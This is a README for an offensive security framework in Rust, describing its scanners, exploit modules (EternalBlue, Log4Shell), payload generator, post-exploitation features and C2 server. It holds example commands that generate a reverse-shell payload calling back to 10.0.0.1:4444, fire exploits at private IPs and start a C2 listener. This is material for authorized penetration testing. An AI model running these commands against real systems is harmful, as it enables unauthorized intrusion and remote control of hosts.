# Rust Cybersecurity Framework (RCF)

[![CI](https://github.com/rcf/rcf/actions/workflows/ci.yml/badge.svg)](https://github.com/rcf/rcf/actions/workflows/ci.yml)
[![License](https://img.shields.io/badge/license-BSD--3--Clause-blue.svg)](LICENSE)
[![Rust](https://img.shields.io/badge/rust-2024-orange.svg)](https://www.rust-lang.org)
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows-lightgrey.svg)](https://github.com/rcf/rcf)

> **Fast. Safe. Modular. Rust.**

**RCF (Rust Cybersecurity Framework)** is a modern, async-first cybersecurity framework built for speed, memory safety, and modularity. Compiling to a single ~4.7MB binary, it serves as a robust alternative to legacy tools, providing 56+ modules for authorized security testing, exploitation, and post-exploitation.

## ⚡ Quick Start

```bash
# Build
cargo build --release

# Start the interactive console
./target/release/rcf

# Scan a target
./target/release/rcf scan -t 192.168.1.1 --ports common

# Search modules
./target/release/rcf search log4j

# Generate a payload
./target/release/rcf venom -p reverse_tcp --lhost 10.0.0.1 --lport 4444 -f c
```

## 🏗 Architecture

```
rcf/
├── rcf-core/       # Core types, traits, Context, Target, Evasion
├── rcf-cli/        # CLI entry point (clap), reports, automation
├── rcf-console/    # Interactive REPL with tab completion
├── rcf-modules/    # Module registry and plugin system
├── rcf-labs/       # 56+ exploit/scanner modules for HTB/THM/OffSec
├── rcf-network/    # TCP scanners, protocol handlers
├── rcf-payload/    # Payload generator, encoders, PE builder
├── rcf-db/         # SQLite + Diesel with credential hashing
└── rcf-c2/         # C2 server with sandboxed command execution
```

## 🚀 Features

### Scanning & Discovery
- **Parallel CIDR scanning** — Scan entire subnets (`192.168.1.0/24`)
- **Protocol fingerprinting** — HTTP, SSH, SMB, VNC, MongoDB, Memcached
- **OS detection** — TCP stack analysis and service banner extraction
- **Auth brute force** — SSH, FTP, HTTP, SNMP, MySQL, PostgreSQL

### Exploitation
- **Real protocol implementations** — BlueKeep (RDP), EternalBlue (SMBv1), ProxyShell
- **Web exploits** — Log4Shell, SQLi, XSS, SSRF, path traversal, SSTI, deserialization
- **Service exploits** — Redis, Tomcat, Jenkins, WordPress, Elasticsearch, Docker API
- **Windows exploitation** — WinRM/PSRemoting, Kerberoasting, AS-REP Roasting

### Post-Exploitation
- **Linux enumeration** — SUID binaries, cron jobs, writable files, sudo misconfigurations
- **Windows enumeration** — Token privileges, registry keys, credential harvesting
- **Meterpreter-style commands** — Shell, upload, download, process listing (with sandboxing)

### Payload Generation
- **Shellcode templates** — linux/x64, linux/x86, macos/x64
- **Encoders** — XOR (single/multi-byte), polymorphic engine
- **Output formats** — C, Python, PowerShell, Ruby, JavaScript, hex, base64, raw, PE
- **Secure execution** — Uses `tempfile` for unpredictable filenames

### Intelligence & Reporting
- **SQLite database** — Hosts, services, credentials (auto-hashed), vulnerabilities
- **Professional reports** — HTML with risk scoring, executive summary, remediation
- **Automated attack chains** — `rcf auto -t <target> -o report.html`
- **Export formats** — JSON, CSV, XML

## 📦 Installation

### From Source

```bash
git clone https://github.com/rcf/rcf.git
cd rcf
cargo build --release -p rcf-cli
sudo cp target/release/rcf /usr/local/bin/
```

### Requirements

- Rust 2024 Edition (1.75+)
- `cargo`

### Optional: Minimal Build

```bash
# Without database and C2 server (~3.5MB)
cargo build --release -p rcf-cli --no-default-features
```

## 📖 Usage

### Interactive Console

```bash
./target/release/rcf
> help
> show modules
> search smb
> use exploit/windows/smb/eternalblue
> set RHOSTS 192.168.1.100
> run
```

### CLI Commands

| Command | Description |
|---------|-------------|
| `rcf` | Start interactive console |
| `rcf scan -t <target>` | Port scan (supports CIDR, ranges) |
| `rcf search <keyword>` | Search modules |
| `rcf info <module>` | Show module details |
| `rcf venom -p <type> --lhost <ip>` | Generate payload |
| `rcf auto -t <target> -o report.html` | Automated attack + report |
| `rcf report generate -o report.html` | Generate report from findings |
| `rcf db stats` | Show database statistics |
| `rcf db export -o data.json` | Export database |
| `rcf c2 listen` | Start C2 server |

### Examples

```bash
# Scan entire /24 subnet
rcf scan -t 192.168.1.0/24 --ports common --threads 100

# Strict TLS validation (for production)
rcf scan -t production.example.com --ports 443 --strict-tls

# Generate and save payload
rcf venom -p reverse_tcp --lhost 10.0.0.1 --lport 4444 -f pe -o shell.exe

# Run specific exploit
rcf run -m exploit/multi/http/log4shell -t 192.168.1.100 -p 8080
```

## 🔒 Security

This project has undergone a comprehensive security audit. See [`SECURITY.md`](SECURITY.md) for vulnerability reporting and [`SECURITY_AUDIT.md`](SECURITY_AUDIT.md) for findings.

**Key security features:**
- Meterpreter command sandboxing (blocks dangerous patterns)
- Automatic credential hashing (SHA-256 + salt)
- HTML escaping in all report generation
- Path validation for file operations
- Secure temp files via `tempfile` crate
- `--strict-tls` flag for TLS validation

> ⚠️ **Never run RCF as root** unless required (e.g., SYN scanning). Use a sandboxed environment.

## 🧪 Development

```bash
# Run tests
cargo test --workspace

# Lint
cargo clippy --workspace -- -D warnings

# Format
cargo fmt

# Cross-compile
make linux-x64   # Linux x86_64
make macos-arm64 # macOS Apple Silicon
make windows-x64 # Windows (requires MinGW)
```

See [`CONTRIBUTING.md`](CONTRIBUTING.md) for contribution guidelines.

## 📄 License

BSD-3-Clause. See [`LICENSE`](LICENSE) for details.

## ⚠️ Disclaimer

This framework is designed for **authorized security testing** and **research purposes only**.
Always obtain proper authorization before testing any systems you do not own.
